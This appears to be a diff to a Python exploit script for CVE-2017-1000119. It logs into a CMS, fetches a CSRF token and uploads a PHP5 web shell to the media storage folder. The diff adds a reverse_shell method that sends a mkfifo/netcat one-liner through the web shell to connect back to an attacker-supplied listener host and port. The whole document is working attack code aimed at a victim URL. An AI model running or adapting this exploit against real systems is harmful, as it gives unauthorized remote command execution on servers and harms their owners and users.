@@ -14,10 +14,11 @@ class CVE2017_1000119:
         "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
     }
 
-    def __init__(self, url, user, pswd):
+    def __init__(self, url, user, pswd, lhost, lport):
         print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
         self.url = url
         self.user, self.pswd = user, pswd
+        self.lhost, self.lport = lhost, lport
         self.session = requests.Session()
 
     # login
@@ -69,7 +70,7 @@ class CVE2017_1000119:
             print (LogColors.RED + "failed get x-csrf-token..." + LogColors.ENDC)
             sys.exit()
 
-    # exploitation logic, cmd - command for example "whoami" or "uname -a"
+    # exploitation logic, upload php5 file
     def exploit(self):
         self.login()
         self.get_token()
@@ -122,14 +123,32 @@ class CVE2017_1000119:
             print (LogColors.RED + "sending payload failed :(" + LogColors.ENDC)
             sys.exit()
 
+    # getting reverse shell
+    def reverse_shell(self):
+        print (LogColors.BLUE + "get reverse shell..." + LogColors.ENDC)
+        reverse_shell = "rm /tmp/f;mkfifo"
+        reverse_shell += " /tmp/f;cat /tmp/f|/bin/sh -i 2>&1"
+        reverse_shell += "|nc " + self.lhost + " " + self.lport + " >/tmp/f"
+        import urllib.parse
+        params = urllib.parse.urlencode(
+            {"cmd" : reverse_shell}, quote_via = urllib.parse.quote_plus
+        )
+        url = self.url.rstrip() + "/storage/app/media/hack.php5?" + params
+        r = self.session.get(url)
+        print (LogColors.GREEN + "successfully got reverse shell :)" + LogColors.ENDC)
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-u','--url', required = True, help = "target url")
     parser.add_argument('-user','--username', required = True, help = "auth username")
     parser.add_argument('-pswd','--password', required = True, help = "auth password")
+    parser.add_argument('-lh','--lhost', required = True, help = "reverse shell listener host")
+    parser.add_argument('-lp','--lport', required = True, help = "reverse shell listener port")
     args = vars(parser.parse_args())
     url = args["url"]
     user, pswd = args["username"], args["password"]
-    cve = CVE2017_1000119(url, user, pswd)
+    lhost, lport = args['lhost'], args['lport']
+    cve = CVE2017_1000119(url, user, pswd, lhost, lport)
     cve.exploit()
+    cve.reverse_shell()
 
